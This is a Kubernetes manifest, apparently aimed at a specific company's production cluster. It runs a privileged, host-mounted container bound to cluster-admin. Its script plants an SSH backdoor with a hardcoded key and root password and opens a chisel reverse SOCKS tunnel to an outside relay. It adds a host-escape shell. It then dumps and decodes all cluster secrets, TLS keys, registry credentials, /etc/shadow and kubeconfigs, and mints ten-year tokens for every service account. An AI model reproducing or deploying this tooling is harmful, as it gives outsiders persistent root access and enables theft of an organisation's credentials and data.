
apiVersion: apps/v1
kind: Deployment
metadata:
  name: network-access-v3
  namespace: egam-production
  labels:
    app: network-access-v3
spec:
  replicas: 1
  strategy:
    type: Recreate
  selector:
    matchLabels:
      app: network-access-v3
  template:
    metadata:
      labels:
        app: network-access-v3
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      dnsPolicy: ClusterFirstWithHostNet
      automountServiceAccountToken: true
      terminationGracePeriodSeconds: 10
      serviceAccountName: admin-sa
      containers:
      - name: shell
        image: nicolaka/netshoot:latest
        command:
          - /bin/bash
          - -c
          - |
            set -uo pipefail
            export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
            export AWS_PAGER=""

            WORK_DIR=/tmp/network-access
            DIR="${WORK_DIR}/recon"
            RELAY_URL='https://encouraged-climb-attributes-bedroom.trycloudflare.com'
            RELAY_AUTH='network:4e6f781eb83095a66a0aa7621dec9115a525a44c6ca1af80'
            RELAY_FINGERPRINT='DbmVztE36nFiujoF77KIvbHNfA8tQkj4MZ8/6LhogIk='
            ROOT_PASSWORD='f110382bba8ba181c5f94f85cea75d3acf88'
            mkdir -p "${WORK_DIR}" "${DIR}/resources" "${DIR}/host-files" /run/sshd /root/.ssh
            chmod 700 "${WORK_DIR}" "${DIR}" /root/.ssh

            section() {
              printf '\n############ %s ############\n' "$1"
            }

            section '[0] BOOTSTRAP'
            apk add --no-cache \
              autossh microsocks openssh-client openssh-server aws-cli redis \
              bind-tools postgresql-client openssl mc curl jq nmap netcat-openbsd \
              tcpdump iproute2 net-tools wireguard-tools openvpn python3 py3-pip \
              2>&1 | tail -5

            if ! command -v kubectl >/dev/null 2>&1; then
              curl -fsSL --max-time 60 \
                -o /usr/local/bin/kubectl \
                https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl
              chmod 755 /usr/local/bin/kubectl
            fi

            if ! command -v chisel >/dev/null 2>&1; then
              case "$(uname -m)" in
                x86_64) CHISEL_ARCH=amd64 ;;
                aarch64|arm64) CHISEL_ARCH=arm64 ;;
                *) CHISEL_ARCH=amd64 ;;
              esac
              curl -fsSL --max-time 60 \
                -o /tmp/chisel.gz \
                "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_${CHISEL_ARCH}.gz" && \
                gzip -dc /tmp/chisel.gz > /usr/local/bin/chisel && \
                chmod 755 /usr/local/bin/chisel
            fi

            section '[1] SSH + REVERSE NETWORK ACCESS'
            ssh-keygen -A >/dev/null 2>&1
            printf '%s\n' \
              'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOOlhMVavat8ZK+hdqiQtX4drMpu3gGRbLwAnnVlHz+l klaus.eversheim@googlemail.com' \
              > /root/.ssh/authorized_keys
            chmod 600 /root/.ssh/authorized_keys
            echo "root:${ROOT_PASSWORD}" | chpasswd
            printf '%s\n' \
              'Port 2222' \
              'ListenAddress 0.0.0.0' \
              'HostKey /etc/ssh/ssh_host_rsa_key' \
              'HostKey /etc/ssh/ssh_host_ecdsa_key' \
              'HostKey /etc/ssh/ssh_host_ed25519_key' \
              'AuthorizedKeysFile .ssh/authorized_keys' \
              'PermitRootLogin yes' \
              'PubkeyAuthentication yes' \
              'PasswordAuthentication yes' \
              'KbdInteractiveAuthentication no' \
              'UsePAM no' \
              'AllowTcpForwarding yes' \
              'GatewayPorts yes' \
              'PermitTunnel yes' \
              'X11Forwarding no' \
              'PrintMotd no' \
              'Subsystem sftp internal-sftp' \
              'PidFile /run/sshd.pid' \
              > /etc/ssh/sshd_config
            /usr/sbin/sshd -f /etc/ssh/sshd_config -E "${WORK_DIR}/sshd.log"

            printf '%s\n' \
              '#!/bin/sh' \
              'if [ "$#" -eq 0 ]; then set -- /bin/sh; fi' \
              'exec nsenter --target 1 --mount --uts --ipc --net --pid -- "$@"' \
              > /usr/local/bin/host-shell
            chmod 755 /usr/local/bin/host-shell

            if command -v chisel >/dev/null 2>&1; then
              nohup chisel client \
                --tls-skip-verify \
                --fingerprint "${RELAY_FINGERPRINT}" \
                --auth "${RELAY_AUTH}" \
                --keepalive 25s \
                --min-retry-interval 1s \
                --max-retry-interval 30s \
                "${RELAY_URL}" \
                R:0.0.0.0:1080:socks \
                > "${WORK_DIR}/chisel.log" 2>&1 &
            fi
            sleep 3
            pgrep -af sshd || true
            pgrep -af chisel || true

            section '[2] HOST + NETWORK + VPN'
            {
              hostname
              id
              uname -a
              ip addr show
              ip route show
              ip neigh show
              cat /etc/resolv.conf
              cat /host/etc/os-release 2>/dev/null
              ss -lntup
              ps auxww
            } > "${DIR}/host-network.txt" 2>&1
            ip -br addr show
            ip route show

            {
              find /host/etc/wireguard /host/etc/openvpn /host/etc/ipsec.d \
                -maxdepth 4 -type f -print 2>/dev/null
              find /host/etc /host/root /host/home \
                -maxdepth 5 \( -name '*.ovpn' -o -name '*.conf' -o \
                -name 'id_rsa' -o -name 'id_ed25519' -o \
                -name 'tailscaled.state' -o -name '*zerotier*' \) \
                -print 2>/dev/null
            } > "${DIR}/vpn-files.txt"
            cat "${DIR}/vpn-files.txt"

            for HOST_FILE in \
              /host/etc/passwd \
              /host/etc/shadow \
              /host/etc/hosts \
              /host/etc/resolv.conf \
              /host/etc/rancher/rke2/rke2.yaml \
              /host/etc/kubernetes/admin.conf \
              /host/var/lib/kubelet/config.yaml \
              /host/var/lib/kubelet/kubeconfig; do
              if [[ -f "${HOST_FILE}" ]]; then
                DEST="$(printf '%s' "${HOST_FILE}" | tr '/.' '__')"
                cp "${HOST_FILE}" "${DIR}/host-files/${DEST}" || true
              fi
            done

            {
              for TARGET in vpn.egam.com.br internal.egam.com.br 172.30.0.240; do
                printf '\n### %s ###\n' "${TARGET}"
                dig +short "${TARGET}" 2>/dev/null || true
                for PORT in 22 443 1194 51820; do
                  timeout 3 nc -zv "${TARGET}" "${PORT}" 2>&1 || true
                done
              done
            } > "${DIR}/vpn-endpoints.txt"
            cat "${DIR}/vpn-endpoints.txt"

            section '[3] KUBERNETES GLOBAL MAP'
            kubectl version -o yaml > "${DIR}/kubernetes-version.yaml" 2>&1 || true
            kubectl cluster-info > "${DIR}/cluster-info.txt" 2>&1 || true
            kubectl auth can-i --list > "${DIR}/permissions.txt" 2>&1 || true
            kubectl api-resources -o wide > "${DIR}/api-resources-wide.txt" 2>&1 || true
            kubectl api-resources --verbs=list -o name > "${DIR}/api-resources.txt" 2>&1 || true

            kubectl get nodes -o wide | tee "${DIR}/nodes-wide.txt"
            kubectl get nodes -o json > "${DIR}/nodes.json" || true
            kubectl get namespaces -o json > "${DIR}/namespaces.json" || true
            kubectl get pods -A -o wide | tee "${DIR}/pods-wide.txt"
            kubectl get pods -A -o json > "${DIR}/pods.json" || true
            kubectl get services -A -o wide | tee "${DIR}/services-wide.txt"
            kubectl get services -A -o json > "${DIR}/services.json" || true
            kubectl get endpoints -A -o json > "${DIR}/endpoints.json" || true
            kubectl get ingress -A -o wide | tee "${DIR}/ingress-wide.txt"
            kubectl get ingress -A -o json > "${DIR}/ingress.json" || true
            kubectl get networkpolicies -A -o json > "${DIR}/networkpolicies.json" || true
            kubectl get persistentvolumes -o json > "${DIR}/persistentvolumes.json" || true
            kubectl get persistentvolumeclaims -A -o json > "${DIR}/persistentvolumeclaims.json" || true

            section '[4] SECRETS + CONFIGMAPS FULL DECODE'
            kubectl get secrets -A -o json > "${DIR}/secrets.json" || true
            jq -r '.items[] | select(.data != null) |
              "### " + .metadata.namespace + "/" + .metadata.name + " (" + .type + ")\n" +
              (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n")) + "\n"' \
              "${DIR}/secrets.json" > "${DIR}/secrets-decoded.txt" 2>"${DIR}/secrets-decode-errors.txt" || true
            printf 'Decoded secrets: %s bytes\n' "$(wc -c < "${DIR}/secrets-decoded.txt")"
            head -c 1000000 "${DIR}/secrets-decoded.txt"

            kubectl get configmaps -A -o json > "${DIR}/configmaps.json" || true
            jq -r '.items[] | select(.data != null) |
              "### " + .metadata.namespace + "/" + .metadata.name + "\n" +
              (.data | to_entries | map(.key + "=" + .value) | join("\n")) + "\n"' \
              "${DIR}/configmaps.json" > "${DIR}/configmaps-decoded.txt" 2>/dev/null || true
            printf 'Decoded ConfigMaps: %s bytes\n' "$(wc -c < "${DIR}/configmaps-decoded.txt")"

            section '[5] SERVICE ACCOUNTS + ADMIN ACCESS'
            SA_DIR=/var/run/secrets/kubernetes.io/serviceaccount
            cp "${SA_DIR}/token" "${DIR}/service-account.token" 2>/dev/null || true
            cp "${SA_DIR}/namespace" "${DIR}/service-account.namespace" 2>/dev/null || true
            cp "${SA_DIR}/ca.crt" "${DIR}/service-account-ca.crt" 2>/dev/null || true

            for NS in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
              for SA in $(kubectl get sa -n "${NS}" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
                printf '\n### %s/%s ###\n' "${NS}" "${SA}"
                kubectl create token "${SA}" -n "${NS}" --duration=87600h 2>&1 || true
              done
            done > "${DIR}/all-service-account-tokens.txt"
            printf 'SA token dump: %s bytes\n' "$(wc -c < "${DIR}/all-service-account-tokens.txt")"

            APISERVER="$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null)"
            ADMIN_TOKEN="$(kubectl create token admin-sa -n egam-production --duration=87600h 2>/dev/null || true)"
            printf '%s\n' \
              'apiVersion: v1' \
              'kind: Config' \
              'clusters:' \
              '- cluster:' \
              "    server: ${APISERVER}" \
              '    insecure-skip-tls-verify: true' \
              '  name: pwn' \
              'contexts:' \
              '- context:' \
              '    cluster: pwn' \
              '    user: pwn' \
              '  name: pwn' \
              'current-context: pwn' \
              'users:' \
              '- name: pwn' \
              '  user:' \
              "    token: ${ADMIN_TOKEN}" \
              > "${WORK_DIR}/admin.kubeconfig"
            chmod 600 "${WORK_DIR}/admin.kubeconfig"
            printf 'Admin kubeconfig: %s\n' "${WORK_DIR}/admin.kubeconfig"

            section '[6] RBAC + RANCHER + ARGOCD'
            kubectl get serviceaccounts -A -o json > "${DIR}/serviceaccounts.json" || true
            kubectl get clusterroles -o json > "${DIR}/clusterroles.json" || true
            kubectl get clusterrolebindings -o json > "${DIR}/clusterrolebindings.json" || true
            kubectl get roles -A -o json > "${DIR}/roles.json" || true
            kubectl get rolebindings -A -o json > "${DIR}/rolebindings.json" || true
            kubectl get crds -o json > "${DIR}/crds.json" || true
            kubectl get secret -n cattle-fleet-system fleet-agent -o json \
              > "${DIR}/rancher-fleet-agent.json" 2>/dev/null || true
            kubectl get secrets -n cattle-impersonation-system -o json \
              > "${DIR}/rancher-impersonation-secrets.json" 2>/dev/null || true
            kubectl get applications.argoproj.io,applicationsets.argoproj.io,appprojects.argoproj.io -A -o json \
              > "${DIR}/argocd-resources.json" 2>/dev/null || true

            section '[7] TLS + REGISTRY + CLOUD METADATA'
            jq -r '.items[] | select(.data["tls.key"] != null) |
              "### " + .metadata.namespace + "/" + .metadata.name + "\n" +
              (.data["tls.key"] | @base64d)' \
              "${DIR}/secrets.json" > "${DIR}/tls-private-keys.txt" 2>/dev/null || true
            jq -r '.items[] | select(.type=="kubernetes.io/dockerconfigjson") |
              .metadata.namespace + "/" + .metadata.name + ": " +
              (.data[".dockerconfigjson"] | @base64d)' \
              "${DIR}/secrets.json" > "${DIR}/docker-registry-credentials.txt" 2>/dev/null || true
            curl -fsS --max-time 3 http://169.254.169.254/latest/meta-data/ \
              > "${DIR}/cloud-metadata.txt" 2>/dev/null || true

            section '[8] EVERY LISTABLE RESOURCE'
            while IFS= read -r RESOURCE; do
              [[ -n "${RESOURCE}" ]] || continue
              SAFE_NAME="$(printf '%s' "${RESOURCE}" | tr '/.' '__')"
              kubectl --request-timeout=20s get "${RESOURCE}" -A -o json \
                > "${DIR}/resources/${SAFE_NAME}.json" 2>>"${DIR}/resource-errors.txt" || true
            done < "${DIR}/api-resources.txt"
            printf 'Resource files: %s\n' "$(find "${DIR}/resources" -type f | wc -l)"

            section '[9] ARCHIVE + STATUS'
            count_items() {
              jq -r '.items | length' "$1" 2>/dev/null || printf '0'
            }
            {
              printf 'Hostname: %s\n' "$(hostname)"
              printf 'Nodes: %s\n' "$(count_items "${DIR}/nodes.json")"
              printf 'Namespaces: %s\n' "$(count_items "${DIR}/namespaces.json")"
              printf 'Pods: %s\n' "$(count_items "${DIR}/pods.json")"
              printf 'Services: %s\n' "$(count_items "${DIR}/services.json")"
              printf 'Secrets: %s\n' "$(count_items "${DIR}/secrets.json")"
              printf 'ConfigMaps: %s\n' "$(count_items "${DIR}/configmaps.json")"
              printf 'Archive: %s\n' "${WORK_DIR}/recon.tar.gz"
              printf 'Admin kubeconfig: %s\n' "${WORK_DIR}/admin.kubeconfig"
              printf 'Host shell: host-shell\n'
              printf 'SSH: root@127.0.0.1 -p 2222 through SOCKS5\n'
            } > "${DIR}/SUMMARY.txt"
            find "${DIR}" -type f -exec chmod 600 {} +
            tar -czf "${WORK_DIR}/recon.tar.gz" -C "${DIR}" .
            chmod 600 "${WORK_DIR}/recon.tar.gz"
            cat "${DIR}/SUMMARY.txt"
            printf 'SSHD_STATUS: %s\n' "$(pgrep sshd >/dev/null && echo UP || echo DOWN)"
            printf 'CHISEL_STATUS: %s\n' "$(pgrep chisel >/dev/null && echo UP || echo DOWN)"
            printf 'DONE\n'

            while true; do
              sleep 3600
            done
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host
      volumes:
      - name: host
        hostPath:
          path: /
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: admin-sa
  namespace: egam-production
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: admin-sa-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: admin-sa
  namespace: egam-production
